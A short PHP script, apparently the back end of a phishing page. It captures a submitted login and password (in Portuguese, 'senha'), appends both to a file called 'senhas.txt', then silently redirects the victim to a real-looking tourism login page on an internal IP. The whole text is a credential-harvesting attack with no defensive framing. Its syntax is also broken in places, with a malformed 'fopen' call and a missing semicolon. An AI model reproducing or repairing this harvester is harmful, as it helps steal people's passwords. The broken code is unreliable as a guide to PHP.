<?php
$caixa1 = $_POST["login"] . "\n";
$caixa2 = $_POST["senha"] . "\n";

file = fopen.("senhas.txt", "a");

$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);

fclose($file);
header("Location: http://172.16.1.10/turismo/login.php")
?>
